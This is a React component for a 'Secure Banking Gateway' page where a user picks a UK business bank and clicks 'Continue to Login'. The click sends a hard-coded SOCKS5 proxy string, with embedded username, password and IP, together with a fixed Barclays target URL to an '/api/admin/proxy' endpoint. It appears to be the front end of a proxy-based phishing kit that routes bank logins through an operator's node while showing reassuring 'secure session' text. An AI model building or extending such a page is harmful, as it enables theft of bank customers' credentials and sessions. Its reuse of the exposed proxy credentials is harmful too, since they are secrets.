"use client";

import { useState } from "react";

export default function ClientBankGateway() {
  const [selectedBank, setSelectedBank] = useState("Lloyds Bank");
  const [loading, setLoading] = useState(false);
  const [sessionActive, setSessionActive] = useState(false);

  const handleStartGateway = async () => {
    setLoading(true);
    try {
      // Backend par proxy aur target URL ke sath session launch request bhejna
      const res = await fetch("/api/admin/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          proxyString: "socks5://i7tf5g2d1j0x:4c4pnyex7f5jzjv@65.111.22.249:1081", 
          targetUrl: "https://www.barclays.co.uk" 
        })
      });
      const data = await res.json();
      if (data.success) {
        setSessionActive(true);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-white flex items-center justify-center p-6">
      <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-8 max-w-md w-full shadow-2xl space-y-6">
        
        <div className="text-center space-y-2">
          <div className="w-12 h-12 bg-blue-600/20 border border-blue-500/30 rounded-full flex items-center justify-center mx-auto text-blue-400 font-bold">
            🔒
          </div>
          <h1 className="text-lg font-black tracking-tight">Secure Banking Gateway</h1>
          <p className="text-xs text-zinc-400">Select your financial institution to initialize isolated proxy session.</p>
        </div>

        {!sessionActive ? (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-zinc-400 mb-1">Choose Bank / Institution:</label>
              <select 
                value={selectedBank}
                onChange={(e) => setSelectedBank(e.target.value)}
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs text-zinc-100 outline-none cursor-pointer"
              >
                <option value="Lloyds Bank">Lloyds Bank (Business)</option>
                <option value="Barclays">Barclays Bank UK</option>
                <option value="HSBC">HSBC Commercial</option>
                <option value="NatWest">NatWest Business Portal</option>
              </select>
            </div>

            <button 
              onClick={handleStartGateway}
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition text-xs shadow-lg cursor-pointer"
            >
              {loading ? "Establishing Secure Node..." : "Continue to Login ➔"}
            </button>
          </div>
        ) : (
          <div className="space-y-4 text-center">
            <div className="p-4 bg-emerald-950/40 border border-emerald-500/30 rounded-xl text-xs text-emerald-400 font-bold animate-pulse">
              ✅ Secure Gateway Active via {selectedBank} Node
            </div>
            <p className="text-xs text-zinc-400">Your isolated browsing session is now running securely.</p>
          </div>
        )}

      </div>
    </div>
  );
}